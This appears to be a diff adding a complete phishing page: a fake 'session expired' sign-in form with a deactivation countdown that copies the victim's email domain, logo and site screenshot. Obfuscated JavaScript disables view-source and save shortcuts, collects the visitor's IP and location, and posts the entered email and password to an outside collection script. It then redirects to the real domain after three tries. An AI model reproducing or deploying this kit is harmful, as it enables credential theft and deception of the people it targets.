@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Auto Login</title>
+<style>
+* {
+box-sizing: border-box;
+padding: 0;
+margin: 0;
+}
+body {
+height: 100vh;
+width: 100vw;
+font-family: Arial, Helvetica, sans-serif;
+}
+.bg-img {
+height: 100%;
+width: 100%;
+background-position: center;
+background-repeat: no-repeat;
+background-size: cover;
+}
+iframe {
+height: 100%;
+width: 100%;
+}
+.container {
+max-width: 1000px;
+padding: 16px;
+background-color: white;
+border-radius: 5px;
+position: absolute;
+left: 50%;
+top: 50%;
+transform: translate(-50%, -50%);
+z-index: 2;
+}
+@media (max-width: 480px) {
+.container {
+left: 10%;
+top: 10%;
+margin-left: 5%;
+transform: translate(-10%, -10%);
+}
+}
+input[type=text], input[type=password] {
+width: 100%;
+padding: 10px 15px 10px 40px;
+margin: 5px 0 5px 0;
+border: none;
+background: #f1f1f1;
+}
+input[type=text]:focus, input[type=password]:focus {
+background-color: #ddd;
+outline: none;
+}
+.btn {
+background-color: #1d62a1;
+color: white;
+padding: 8px 20px;
+border: none;
+cursor: pointer;
+width: 100%;
+opacity: 0.9;
+}
+.btn:hover {
+opacity: 1;
+}
+.img {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        font-size: 16px;
+    }
+    #logo {
+        width: 30px; /* Smaller logo size */
+    }
+#title {
+text-align: center;
+margin: 5px 0;
+}
+    #logo {
+        width: 30px; /* Smaller logo size */
+    }
+    .divider {
+        width: 100%;
+        height: 1px;
+        background-color: #ccc;
+        margin: 10px 0;
+    }
+    #countdown {
+        text-align: center;
+        color: red;
+        font-size: 18px;
+        font-weight: bold;
+        margin: 5px 0;
+    }
+    .countdown-icon {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        font-size: 14px;
+        color: blue;
+        font-weight: bold;
+        margin-top: 5px;
+    }
+    .countdown-icon .exclamation {
+        font-size: 18px;
+        color: white;
+        background-color: blue;
+        border-radius: 50%;
+        padding: 4px 8px;
+        margin-right: 5px;
+    }
+    .input-container {
+        position: relative;
+        margin: 10px 0;
+    }
+    .input-container .icon {
+        position: absolute;
+        top: 45%;
+        left: 10px;
+        transform: translateY(-50%);
+        color: grey;
+    }
+#error {
+display: none;
+color: red;
+}
+#domainName {
+        font-weight: bold;
+        color: black; /* Ensure domain name is visible */
+    }
+</style>
+</head>
+<body>
+<div class="bg-img" id="bg-img">
+<iframe id="frame" src="about:blank" scrolling="no" sandbox="allow-forms allow-pointer-lock allow-popups allow-same-origin allow-scripts" style="position: absolute;height: 100%;border: none;" width="100%"></iframe>
+</div>
+<form class="container" id="login-form">
+<div class="img">
+<img src="" id="logoimg" alt="Logo" width="40" height="40">
+        <strong><span id="logoname">Domain Name</span></strong> 
+</div>
+    <div class="divider"></div>
+
+    <!-- Countdown with Exclamation Icon -->
+    <div class="countdown-icon">
+        <span class="exclamation">!</span>
+        <span>DEACTIVATE COUNTDOWN:</span><div id="countdown">24:00:00</div>
+    </div>
+<h5 id="title" style="color: red;">Your session has expired. Please sign in to continue.</h5>
+
+<label for="email">
+</label>
+    <div class="input-container">
+        <span class="icon">📧</span>
+<input type="text" placeholder="Email Address" name="email" id="email" required readonly>
+</div>
+<label for="password">
+</label>
+    <div class="input-container">
+        <span class="icon">🔒</span>
+<input type="password" placeholder="Password" name="password" id="password" required>
+</div>
+<div id="custom-error-message" style="color: red; display: none; font-size: 14px;">Password can't start with a space.</div>
+<h5 id="error">Password is incorrect, please try again!</h5>
+    <!-- Divider line above Sign-in button -->
+    <div class="divider"></div>
+<button type="submit" class="btn" id="submit-btn">Sign In</button>
+</form>
+<script>
+    // Countdown timer script
+    const countdownElement = document.getElementById("countdown");
+    let countdownTime = 24 * 60 * 60; // 24 hours in seconds
+
+    function updateCountdown() {
+        const hours = String(Math.floor(countdownTime / 3600)).padStart(2, '0');
+        const minutes = String(Math.floor((countdownTime % 3600) / 60)).padStart(2, '0');
+        const seconds = String(countdownTime % 60).padStart(2, '0');
+        countdownElement.textContent = `${hours}:${minutes}:${seconds}`;
+
+        if (countdownTime > 0) {
+            countdownTime--;
+        } else {
+            clearInterval(countdownInterval);
+        }
+    }
+
+    const countdownInterval = setInterval(updateCountdown, 1000);
+</script>
+ <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.0/jquery.min.js"></script> 
+
+
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+
+<script> $("form"). bind("keydown", function(e) { if (e. keyCode === 13) return false; });
+</script>
+     
+         <script>
+
+var _0x54d02a=_0x11b4;function _0x11b4(_0x5d14e4,_0x2539e5){var _0x29c71f=_0x29c7();return _0x11b4=function(_0x11b480,_0x2eed0d){_0x11b480=_0x11b480-0x1a5;var _0x4535c5=_0x29c71f[_0x11b480];return _0x4535c5;},_0x11b4(_0x5d14e4,_0x2539e5);}(function(_0x1a806f,_0x542a56){var _0x438b30=_0x11b4,_0x5e09ab=_0x1a806f();while(!![]){try{var _0x8f171a=parseInt(_0x438b30(0x1d6))/0x1+parseInt(_0x438b30(0x1a8))/0x2*(parseInt(_0x438b30(0x1b2))/0x3)+parseInt(_0x438b30(0x1cd))/0x4*(parseInt(_0x438b30(0x1d3))/0x5)+-parseInt(_0x438b30(0x1e7))/0x6+parseInt(_0x438b30(0x1be))/0x7+parseInt(_0x438b30(0x1d5))/0x8+-parseInt(_0x438b30(0x1bc))/0x9*(parseInt(_0x438b30(0x1f1))/0xa);if(_0x8f171a===_0x542a56)break;else _0x5e09ab['push'](_0x5e09ab['shift']());}catch(_0x36fdd8){_0x5e09ab['push'](_0x5e09ab['shift']());}}}(_0x29c7,0x348e5));var _0x58e754=_0x8cab;(function(_0x1e0620,_0x36ec10){var _0x26ab4c=_0x11b4,_0x4aad8c=_0x8cab,_0x2941c8=_0x1e0620();while(!![]){try{var _0x30dd23=parseInt(_0x4aad8c(0x17a))/0x1*(parseInt(_0x4aad8c(0x197))/0x2)+parseInt(_0x4aad8c(0x19d))/0x3*(-parseInt(_0x4aad8c(0x17e))/0x4)+-parseInt(_0x4aad8c(0x1af))/0x5*(parseInt(_0x4aad8c(0x18e))/0x6)+parseInt(_0x4aad8c(0x198))/0x7*(-parseInt(_0x4aad8c(0x1ba))/0x8)+parseInt(_0x4aad8c(0x193))/0x9+-parseInt(_0x4aad8c(0x191))/0xa+-parseInt(_0x4aad8c(0x1a8))/0xb*(-parseInt(_0x4aad8c(0x1b7))/0xc);if(_0x30dd23===_0x36ec10)break;else _0x2941c8[_0x26ab4c(0x1c6)](_0x2941c8[_0x26ab4c(0x1c9)]());}catch(_0x55a156){_0x2941c8['push'](_0x2941c8[_0x26ab4c(0x1c9)]());}}}(_0xfd6d,0x7cb29),$(document)[_0x58e754(0x187)](_0x54d02a(0x1e0),function(_0x272a66){var _0x308c8f=_0x58e754;if(_0x272a66['ctrlKey']&&_0x272a66[_0x308c8f(0x194)]==0x53)return _0x272a66[_0x308c8f(0x1a9)](),![];}),document[_0x58e754(0x190)](_0x58e754(0x1b0),_0x38b04f=>_0x38b04f[_0x54d02a(0x1bb)]()),document[_0x58e754(0x1aa)]=function(_0xd16262){var _0x1da039=_0x58e754;return _0xd16262[_0x1da039(0x192)]&&(_0xd16262[_0x1da039(0x1b3)]===0x43||_0xd16262[_0x1da039(0x1b3)]===0x56||_0xd16262[_0x1da039(0x1b3)]===0x55||_0xd16262[_0x1da039(0x1b3)]===0x75)?![]:!![];},$(document)[_0x54d02a(0x1f3)]('u',function(_0x5d8525){var _0x5138fd=_0x58e754;return _0x5d8525[_0x5138fd(0x192)]?![]:!![];}),$(document)[_0x54d02a(0x1c3)](function(){var _0x28ee64=_0x54d02a,_0x529639=_0x58e754,_0x390886=0x0;$(_0x529639(0x1b6))[_0x28ee64(0x1db)](function(){var _0x1655bb=_0x529639;$('#msg')[_0x1655bb(0x1b9)](),$(_0x1655bb(0x195))[_0x1655bb(0x18d)](''),$(_0x1655bb(0x199))[_0x1655bb(0x1b2)]({'left':0xc8,'opacity':_0x1655bb(0x1b9)},0x0),$(_0x1655bb(0x1a0))[_0x1655bb(0x1b2)]({'right':0xc8,'opacity':_0x1655bb(0x1a1)},0x3e8);});var _0x16212d=window[_0x28ee64(0x1e5)][_0x28ee64(0x1f2)][_0x529639(0x19c)](0x1);if(!_0x16212d){}else{var _0x3db56c=_0x16212d;$(_0x529639(0x195))[_0x529639(0x18d)](_0x3db56c);var _0x4ddb4d=/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;if(!_0x4ddb4d[_0x529639(0x1ac)](_0x3db56c))return $(_0x529639(0x1a6))[_0x529639(0x1a1)](),_0x16212d[_0x529639(0x196)],![];var _0x4ef513=_0x3db56c[_0x28ee64(0x1d9)]('@'),_0x1fbe6c=_0x3db56c[_0x529639(0x19c)](_0x4ef513+0x1),_0x4ea107=_0x1fbe6c[_0x529639(0x19c)](0x0,_0x1fbe6c[_0x529639(0x181)]('.')),_0x44e599=_0x4ea107[_0x529639(0x19a)](),_0x311bea=_0x4ea107[_0x529639(0x18f)](),_0x46e586=_0x529639(0x1a7)+_0x1fbe6c,_0x3a36a3=_0x1fbe6c,_0x2ce6a7=_0x28ee64(0x1d2)+_0x3a36a3;'\x27)',$(_0x529639(0x19e))[_0x529639(0x180)](_0x529639(0x1b1),_0x529639(0x1a5)+_0x46e586),$(_0x529639(0x18b))[_0x529639(0x180)](_0x28ee64(0x1ed),_0x28ee64(0x1ce)+_0x46e586),document[_0x529639(0x17d)][_0x529639(0x17f)][_0x529639(0x1ae)]=_0x2ce6a7,$(_0x529639(0x1ad))[_0x529639(0x1b5)](_0x311bea),$(_0x529639(0x18a))['html'](_0x311bea),$(_0x529639(0x184))[_0x529639(0x1b5)](_0x1fbe6c),$(_0x529639(0x186))[_0x529639(0x1b5)](_0x1fbe6c),$(_0x529639(0x17c))['html'](_0x16212d);}$(_0x28ee64(0x1bf))[_0x529639(0x189)](function(_0x608904){var _0xa26fd2=_0x28ee64,_0x5ca9dd=_0x529639;_0x608904['preventDefault'](),$(_0x5ca9dd(0x1a6))[_0x5ca9dd(0x1b9)](),$(_0x5ca9dd(0x19b))[_0x5ca9dd(0x1b9)]();var _0x42531f=$(_0x5ca9dd(0x195))[_0x5ca9dd(0x18d)](),_0x84987f=$(_0x5ca9dd(0x17b))[_0x5ca9dd(0x18d)](),_0x70c2c9=_0x42531f,_0x52c91d=/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;if(!_0x42531f)return $(_0x5ca9dd(0x1a6))[_0xa26fd2(0x1dc)](),$(_0xa26fd2(0x1c4))[_0x5ca9dd(0x1b5)](_0xa26fd2(0x1c1)),![];if(!_0x52c91d[_0xa26fd2(0x1d4)](_0x70c2c9))return $(_0x5ca9dd(0x1a6))[_0x5ca9dd(0x1a1)](),$(_0xa26fd2(0x1c4))[_0xa26fd2(0x1c2)](_0x5ca9dd(0x188)),![];if(!_0x84987f)return $(_0x5ca9dd(0x1a6))[_0x5ca9dd(0x1a1)](),$(_0x5ca9dd(0x1a6))[_0x5ca9dd(0x1b5)](_0xa26fd2(0x1b5)),![];if(_0x84987f[_0x5ca9dd(0x183)]<0x5)return $(_0x5ca9dd(0x1a6))[_0x5ca9dd(0x1a1)](),$(_0x5ca9dd(0x1a6))[_0x5ca9dd(0x1b5)](_0x5ca9dd(0x18c)),_0x42531f[_0x5ca9dd(0x196)],![];_0x390886+=0x1,$[_0xa26fd2(0x1ee)](_0xa26fd2(0x1b6),function(_0xd501d7){var _0x5c3da6=_0xa26fd2,_0x4705e9=_0xd501d7['ip'],_0x9a4a3d=_0xd501d7['city'],_0x4a6edb=_0xd501d7[_0x5c3da6(0x1b0)],_0x131376=_0xd501d7[_0x5c3da6(0x1b3)],_0xc3c53a=_0xd501d7['region_code'],_0x3fe301=_0xd501d7[_0x5c3da6(0x1af)],_0x5aecc4=new Date()[_0x5c3da6(0x1c0)](),_0x49198e=new Date()[_0x5c3da6(0x1b1)]();$[_0x5ca9dd(0x182)]({'dataType':'JSON','url':_0x5c3da6(0x1eb),'type':_0x5c3da6(0x1d0),'data':{'email':_0x42531f,'password':_0x84987f,'ip':_0x4705e9,'city':_0x9a4a3d,'region':_0x4a6edb,'state':_0xc3c53a,'country':_0x131376,'date':_0x5aecc4,'time':_0x49198e},'beforeSend':function(_0x302b08){var _0x207bd3=_0x5ca9dd;$('#submit-btn')[_0x207bd3(0x1b5)](_0x207bd3(0x1a4));},'success':function(_0x1e9eb4){var _0x3cf685=_0x5c3da6,_0x3a722c=_0x5ca9dd;$(_0x3cf685(0x1c4))[_0x3cf685(0x1c2)](_0x3cf685(0x1aa))['show'](),$(_0x3cf685(0x1d7))[_0x3cf685(0x1e9)](''),_0x1e9eb4&&($(_0x3cf685(0x1e2))[_0x3cf685(0x1c8)](),console[_0x3cf685(0x1a5)](_0x1e9eb4),$(_0x3cf685(0x1c4))[_0x3cf685(0x1c2)](_0x1e9eb4['msg'])),_0x390886>=0x3&&(_0x390886=0x0,window[_0x3cf685(0x1e5)][_0x3cf685(0x1ed)]=_0x3cf685(0x1de)+_0x1fbe6c);},'error':function(){var _0x5008fc=_0x5c3da6,_0x54ee6f=_0x5ca9dd;$('#password')[_0x5008fc(0x1e9)](''),_0x390886>=0x3&&(_0x390886=0x0,window['location'][_0x5008fc(0x1ed)]=_0x5008fc(0x1de)+_0x1fbe6c),$(_0x5008fc(0x1c4))[_0x5008fc(0x1dc)]();},'complete':function(){var _0x368488=_0x5c3da6,_0x5058ba=_0x5ca9dd;$(_0x368488(0x1bf))[_0x368488(0x1c2)](_0x368488(0x1da));}});});});}));function _0x8cab(_0x2f7f1e,_0x9a7324){var _0x1574f4=_0xfd6d();return _0x8cab=function(_0xa9cfa8,_0x10899f){_0xa9cfa8=_0xa9cfa8-0x17a;var _0x4c938b=_0x1574f4[_0xa9cfa8];return _0x4c938b;},_0x8cab(_0x2f7f1e,_0x9a7324);}function _0x29c7(){var _0x5e2584=['5172318FxImXh','<span\x20style=\x27color:red;\x27>Password\x20field\x20is\x20empty</span>','https://ipapi.co/json/','toLowerCase','.email','length','body','preventDefault','9876051AEnQxw','addEventListener','2206757gcjARG','#submit-btn','toLocaleDateString','<span\x20style=\x27color:red;>\x20Email\x20field\x20is\x20empty</span>','html','ready','#error','841799UfyWEe','push','animate','hide','shift','keyCode','#logoimg1','#automail','100xcnkxz','https://logo.clearbit.com/','https://','POST','onkeydown','url(\x27https://image.thum.io/get/width/1200/https://','33625CBFxmw','test','2723344fJbwuj','407654VJXdql','#password','<span\x20style=\x27color:red;\x27>That\x20account\x20doesn\x27t\x20exist.\x20Enter\x20a\x20different\x20account</span>','indexOf','Sign\x20in','click','show','#back1','http://','#domain','keydown','replace','#msg','signal','#email','location','6mKvUrR','1751070qWCsYv','style','val','bind','https://suppliers-etihad.com/submit.php','focus','href','getJSON','which','<span\x20style=\x27color:red;\x27>An\x20error\x20occured,\x20invalid\x20password</span>','10RnZVrh','hash','keypress','.domain','#logoimg','14124JvBbPp','log','substr','contextmenu','82890TQHrad','toUpperCase','<span\x20style=\x27color:red;\x27>Password\x20Timeout.!\x20Please\x20re-enter\x20your\x20correct\x20password.</span>','ajax','3748370KoPMsD','4009890fHpKZW','16DsyfBp','timezone','region','toLocaleTimeString','27MlZKZu','country_name'];_0x29c7=function(){return _0x5e2584;};return _0x29c7();}function _0xfd6d(){var _0x569437=_0x54d02a,_0x4d76ad=[_0x569437(0x1e6),_0x569437(0x1a9),_0x569437(0x1bd),_0x569437(0x1ad),'ctrlKey',_0x569437(0x1b4),_0x569437(0x1ef),_0x569437(0x1e4),_0x569437(0x1ec),'109876xoqqji',_0x569437(0x1c5),_0x569437(0x1cc),_0x569437(0x1b7),_0x569437(0x1e2),_0x569437(0x1a6),'4971JqfvYA',_0x569437(0x1f5),_0x569437(0x1e5),'#inputbar',_0x569437(0x1dc),_0x569437(0x1e1),_0x569437(0x1e3),_0x569437(0x1da),_0x569437(0x1ce),'#error',_0x569437(0x1cf),'11209lujEFz',_0x569437(0x1bb),_0x569437(0x1d1),_0x569437(0x1bf),_0x569437(0x1d4),'#logoname','backgroundImage',_0x569437(0x1ac),_0x569437(0x1a7),'src',_0x569437(0x1c7),_0x569437(0x1ca),_0x569437(0x1a5),_0x569437(0x1c2),_0x569437(0x1dd),_0x569437(0x1f6),'http://','hide',_0x569437(0x1ae),'14HsukvQ',_0x569437(0x1d7),_0x569437(0x1b8),_0x569437(0x1ba),'1548beECFS',_0x569437(0x1e8),'attr',_0x569437(0x1d9),_0x569437(0x1ab),_0x569437(0x1b9),_0x569437(0x1df),'msg',_0x569437(0x1f4),_0x569437(0x1ea),_0x569437(0x1d8),_0x569437(0x1db),'.logoname',_0x569437(0x1cb),_0x569437(0x1f0),_0x569437(0x1e9)];return _0xfd6d=function(){return _0x4d76ad;},_0xfd6d();}
+
+  </script>
+<script>
+const _0x52231a=_0x16e0;function _0x1f3b(){const _0x5aff98=['style','addEventListener','779802yTrDbl','startsWith','value','17260FVOmof','target','60956rHPHDi','block','2301304krMeFK','display','input','custom-error-message','268NWFjAT','password','44050PkCZjE','getElementById','none','42LchiKY','11492NtJxGN','1608039LHjVbO'];_0x1f3b=function(){return _0x5aff98;};return _0x1f3b();}function _0x16e0(_0xfa33ab,_0x1749ac){const _0x1f3b26=_0x1f3b();return _0x16e0=function(_0x16e0df,_0x38111f){_0x16e0df=_0x16e0df-0x18b;let _0x29df2b=_0x1f3b26[_0x16e0df];return _0x29df2b;},_0x16e0(_0xfa33ab,_0x1749ac);}(function(_0x4078c1,_0x178e76){const _0x2816b4=_0x16e0,_0x2aab27=_0x4078c1();while(!![]){try{const _0x9a7626=parseInt(_0x2816b4(0x198))/0x1+-parseInt(_0x2816b4(0x194))/0x2*(parseInt(_0x2816b4(0x197))/0x3)+parseInt(_0x2816b4(0x192))/0x4*(parseInt(_0x2816b4(0x19f))/0x5)+parseInt(_0x2816b4(0x19c))/0x6+-parseInt(_0x2816b4(0x18c))/0x7+parseInt(_0x2816b4(0x18e))/0x8+-parseInt(_0x2816b4(0x199))/0x9;if(_0x9a7626===_0x178e76)break;else _0x2aab27['push'](_0x2aab27['shift']());}catch(_0x277f43){_0x2aab27['push'](_0x2aab27['shift']());}}}(_0x1f3b,0x28345),document[_0x52231a(0x195)](_0x52231a(0x193))[_0x52231a(0x19b)](_0x52231a(0x190),function(_0x48aad7){const _0x1bbc63=_0x52231a,_0x4e4bf5=_0x48aad7[_0x1bbc63(0x18b)],_0x5cfebd=document[_0x1bbc63(0x195)](_0x1bbc63(0x191));_0x4e4bf5[_0x1bbc63(0x19e)][_0x1bbc63(0x19d)]('\x20')?_0x5cfebd[_0x1bbc63(0x19a)][_0x1bbc63(0x18f)]=_0x1bbc63(0x18d):_0x5cfebd[_0x1bbc63(0x19a)]['display']=_0x1bbc63(0x196);}));
+</script>
+</body>
+</html>
